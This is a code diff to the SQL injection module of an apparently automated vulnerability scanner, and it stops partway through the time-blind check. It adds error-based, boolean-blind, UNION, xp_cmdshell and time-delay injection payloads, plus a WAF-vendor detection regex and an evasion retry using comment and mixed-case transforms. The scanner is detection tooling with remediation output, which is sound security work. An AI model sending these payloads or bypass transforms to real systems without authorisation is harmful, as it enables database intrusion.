@@ -18,6 +18,7 @@ from sentinelx.core.http import ScanClient, ScanConfig
 from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
 from sentinelx.core.diff import is_significant_change, diff_bodies
 from sentinelx.core.encoding import apply as enc_apply
+from sentinelx.core.baseline import get_baseline, adaptive_delay
 
 
 DB_ERRORS = [
@@ -49,24 +50,69 @@ DB_ERRORS = [
 ]
 DB_ERROR_RES = [(re.compile(p, re.I), db) for p, db in DB_ERRORS]
 
-ERROR_PAYLOADS = ["'", '"', "'\"", "`", "')", '")', "' OR '1'='1", '" OR "1"="1']
+ERROR_PAYLOADS = ["'", '"', "'\"", "`", "')", '")', "' OR '1'='1", '" OR "1"="1',
+    # --- expanded: stacked queries, comment variants, type juggling ---
+    "'; -- ", '"; -- ', "' OR 1=1-- -", '" OR 1=1-- -',
+    "' OR 'a'='a", '" OR "a"="a', "') OR ('1'='1", '") OR ("1"="1',
+    "' AND 1=CAST((SELECT version()) AS INT)-- -",
+    "' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -",
+    "1' AND '1'='1", '1" AND "1"="1', "1') AND ('1'='1",
+    "' OR SLEEP(0)-- -",  # benign timing probe (fast)
+    "\\'", "\\\"",  # backslash escapes
+    "'%00",  # null byte
+    "'; EXEC xp_cmdshell('echo sx')-- -",  # MSSQL stacked (safe: echo only)
+]
 
 BOOLEAN_TRUE = [
     "' AND '1'='1", "' AND '1'='1' -- ", "' AND 1=1-- -",
     '" AND "1"="1', " AND 1=1", "' OR '1'='1",
+    # --- expanded ---
+    "' AND 1=1 AND '1'='1", '" AND 1=1 AND "1"="1',
+    "' AND 'a'='a", "' OR 1=1-- -", "1' AND '1'='1' -- ",
+    "') AND ('1'='1", "' AND 2>1-- -",
 ]
 BOOLEAN_FALSE = [
     "' AND '1'='2", "' AND '1'='2' -- ", "' AND 1=2-- -",
     '" AND "1"="2', " AND 1=2", "' OR '1'='2",
+    # --- expanded ---
+    "' AND '1'='2' AND '1'='1", '" AND "1"="2" AND "1"="1',
+    "' AND 'a'='b", "' OR 1=2-- -", "1' AND '1'='2' -- ",
+    "') AND ('1'='2", "' AND 2>3-- -",
 ]
 
 TIME_PAYLOADS = [
-    ("MySQL", "' AND SLEEP(5)-- -", 5),
-    ("MySQL", "' AND (SELECT SLEEP(5))-- -", 5),
-    ("PostgreSQL", "' AND pg_sleep(5)-- -", 5),
-    ("MSSQL", "'; WAITFOR DELAY '0:0:5'-- -", 5),
-    ("Oracle", "' AND DBMS_LOCK.SLEEP(5)-- -", 5),
+    # (dbname, payload_template, delay_scale) — delay computed adaptively
+    # from baseline RTT via adaptive_delay(); templates use {d} for seconds
+    ("MySQL", "' AND SLEEP({d})-- -"),
+    ("MySQL", "' AND (SELECT SLEEP({d}))-- -"),
+    ("PostgreSQL", "' AND pg_sleep({d})-- -"),
+    ("MSSQL", "'; WAITFOR DELAY '0:0:{d}'-- -"),
+    ("Oracle", "' AND DBMS_LOCK.SLEEP({d})-- -"),
 ]
+
+def _order_by_tech(payloads: list, config) -> list:
+    """Smart mode: order time payloads by detected tech stack.
+    PHP -> MySQL first; Python/Django/Flask -> PostgreSQL/SQLite;
+    ASP.NET -> MSSQL. Unknown tech: original order."""
+    if not config.smart or not config.tech_stack:
+        return payloads
+    tech = " ".join(config.tech_stack).lower()
+    priority = []
+    if "php" in tech or "wordpress" in tech or "laravel" in tech:
+        priority = ["MySQL", "PostgreSQL", "MSSQL", "Oracle"]
+    elif "django" in tech or "flask" in tech or "python" in tech:
+        priority = ["PostgreSQL", "MySQL", "Oracle", "MSSQL"]
+    elif "asp.net" in tech or "iis" in tech:
+        priority = ["MSSQL", "MySQL", "PostgreSQL", "Oracle"]
+    elif "express" in tech or "node" in tech:
+        priority = ["MySQL", "PostgreSQL", "MSSQL", "Oracle"]
+    if not priority:
+        return payloads
+    ordered = []
+    for db in priority:
+        ordered.extend([p for p in payloads if p[0] == db])
+    ordered.extend([p for p in payloads if p not in ordered])
+    return ordered
 
 # UNION-based extraction: marker-wrapped version functions per DBMS dialect.
 UNION_MARKER = "SXV"
@@ -142,29 +188,27 @@ async def scan_endpoint(client: ScanClient, config: ScanConfig,
     headers = {"User-Agent": config.user_agent}
 
     for param in params:
-        # ---- baseline: 2 samples for stability ----
-        base_bodies, base_status, base_time = [], 200, 0.0
-        base_ok = True
-        for _ in range(2):
-            resp, full, body_sent, elapsed = await _send(
-                client, method, url, params, param, params[param])
-            if not resp:
-                base_ok = False; break
-            base_bodies.append(resp.text); base_status = resp.status_code
-            base_time += elapsed
-        if not base_ok:
-            continue
-        base_time /= 2
-        base_body = base_bodies[0]
-        if len(base_bodies) == 2 and base_bodies[0] != base_bodies[1]:
+        # ---- shared baseline (fetched once per endpoint, reused by all modules) ----
+        bl = await get_baseline(client, method, url, params)
+        if not bl or not bl.stable:
             continue  # unstable baseline; skip to avoid false positives
+        base_body, base_status, base_time = bl.body, bl.status, bl.avg_time
+        # adaptive time-blind delay scaled to measured RTT
+        delay = adaptive_delay(base_time)
 
         # ---- 1. error-based ----
+        error_hit = False
+        waf_blocked = False
         for payload in ERROR_PAYLOADS:
             resp, full, body_sent, elapsed = await _send(
                 client, method, url, params, param, params[param] + payload)
             if not resp:
                 continue
+            # track WAF blocks for conditional evasion retry
+            if resp.status_code == 403 and re.search(
+                    r"waf|blocked|forbidden|incapsula|cloudflare|akamai|sucuri",
+                    resp.text, re.I):
+                waf_blocked = True
             db = detect_db_error(resp.text)
             if db and not detect_db_error(base_body):
                 ev = _evidence(method, full, headers, body_sent, resp)
@@ -178,44 +222,82 @@ async def scan_endpoint(client: ScanClient, config: ScanConfig,
                     remediation=REMEDIATION_SQLI,
                     references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                 ))
+                error_hit = True
                 break
 
-        # ---- 2. boolean-blind: TRUE vs FALSE, 3 samples each ----
-        true_bodies, false_bodies = [], []
-        for _ in range(3):
-            rt, full_t, _, _ = await _send(
-                client, method, url, params, param, params[param] + BOOLEAN_TRUE[0])
-            rf, full_f, _, _ = await _send(
-                client, method, url, params, param, params[param] + BOOLEAN_FALSE[0])
-            if rt: true_bodies.append(rt.text)
-            if rf: false_bodies.append(rf.text)
-        if len(true_bodies) == 3 and len(false_bodies) == 3:
-            true_stable = len(set(true_bodies)) == 1
-            false_stable = len(set(false_bodies)) == 1
-            differ = true_bodies[0] != false_bodies[0]
-            true_matches_base, _ = is_significant_change(
-                base_body, true_bodies[0], base_status, base_status)
-            false_differs, _ = is_significant_change(
-                base_body, false_bodies[0], base_status, base_status)
-            if true_stable and false_stable and differ and not true_matches_base and false_differs:
-                resp, full, body_sent, _ = await _send(
-                    client, method, url, params, param, params[param] + BOOLEAN_TRUE[0])
-                ev = _evidence(method, full, headers, body_sent, resp)
-                ev.proof = ("TRUE payload reproduced baseline exactly (3/3 samples); "
-                            "FALSE payload changed content (3/3 samples)")
-                findings.append(Finding(
-                    type="SQL Injection", subtype="boolean-blind",
-                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-                    confidence=0.90, url=full, method=method, param=param,
-                    payload=BOOLEAN_TRUE[0], evidence=ev, cwe="CWE-89",
-                    owasp="A03:2021 – Injection",
-                    remediation=REMEDIATION_SQLI,
-                    references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
-                ))
+        # WAF evasion: only if blocked and no hit — retry top payloads with
+        # transforms (conditional, not multiplicative)
+        if waf_blocked and not error_hit:
+            for payload in ERROR_PAYLOADS[:4]:
+                for transform in ("sql_comment", "mixed_case"):
+                    evar = enc_apply(params[param] + payload, transform)
+                    resp, full, body_sent, _ = await _send(
+                        client, method, url, params, param, evar)
+                    if not resp:
+                        continue
+                    db = detect_db_error(resp.text)
+                    if db and not detect_db_error(base_body):
+                        ev = _evidence(method, full, headers, body_sent, resp)
+                        ev.proof = (f"Database error signature for {db} via WAF-evasion "
+                                    f"({transform}) — WAF bypassed")
+                        findings.append(Finding(
+                            type="SQL Injection", subtype="error-based-waf-bypass",
+                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                            confidence=0.90, url=full, method=method, param=param,
+                            payload=evar, evidence=ev, cwe="CWE-89",
+                            owasp="A03:2021 – Injection",
+                            remediation=REMEDIATION_SQLI,
+                            references=["https://owasp.org/www-community/attacks/SQL_Injection"],
+                        ))
+                        error_hit = True
+                        break
+                if error_hit:
+                    break
 
-        # ---- 3. time-blind with baseline subtraction ----
-        if config.safe_mode or True:  # SLEEP is non-destructive
-            for dbname, payload, delay in TIME_PAYLOADS:
+        # ---- 2. boolean-blind: TRUE vs FALSE, 3 samples each ----
+        # (skip if error-based already confirmed SQLi on this param)
+        sqli_confirmed = any(f.param == param and f.type == "SQL Injection"
+                             for f in findings)
+        if not sqli_confirmed:
+            true_bodies, false_bodies = [], []
+            for _ in range(3):
+                rt, full_t, _, _ = await _send(
+                    client, method, url, params, param, params[param] + BOOLEAN_TRUE[0])
+                rf, full_f, _, _ = await _send(
+                    client, method, url, params, param, params[param] + BOOLEAN_FALSE[0])
+                if rt: true_bodies.append(rt.text)
+                if rf: false_bodies.append(rf.text)
+            if len(true_bodies) == 3 and len(false_bodies) == 3:
+                true_stable = len(set(true_bodies)) == 1
+                false_stable = len(set(false_bodies)) == 1
+                differ = true_bodies[0] != false_bodies[0]
+                true_matches_base, _ = is_significant_change(
+                    base_body, true_bodies[0], base_status, base_status)
+                false_differs, _ = is_significant_change(
+                    base_body, false_bodies[0], base_status, base_status)
+                if true_stable and false_stable and differ and not true_matches_base and false_differs:
+                    resp, full, body_sent, _ = await _send(
+                        client, method, url, params, param, params[param] + BOOLEAN_TRUE[0])
+                    ev = _evidence(method, full, headers, body_sent, resp)
+                    ev.proof = ("TRUE payload reproduced baseline exactly (3/3 samples); "
+                                "FALSE payload changed content (3/3 samples)")
+                    findings.append(Finding(
+                        type="SQL Injection", subtype="boolean-blind",
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                        confidence=0.90, url=full, method=method, param=param,
+                        payload=BOOLEAN_TRUE[0], evidence=ev, cwe="CWE-89",
+                        owasp="A03:2021 – Injection",
+                        remediation=REMEDIATION_SQLI,
+                        references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
+                    ))
+
+        # ---- 3. time-blind with baseline subtraction (adaptive delay) ----
+        # (skip if SQLi already confirmed on this param by cheaper techniques)
+        sqli_confirmed = any(f.param == param and f.type == "SQL Injection"
+                             for f in findings)
+        if (config.safe_mode or True) and not sqli_confirmed:  # SLEEP is non-destructive
+            for dbname, tmpl in _order_by_tech(TIME_PAYLOADS, config):
+                payload = tmpl.format(d=int(delay))
                 # measure baseline jitter with 2 normal samples first (already have base_time)
                 t0 = time.monotonic()
                 resp, full, body_sent, elapsed = await _send(
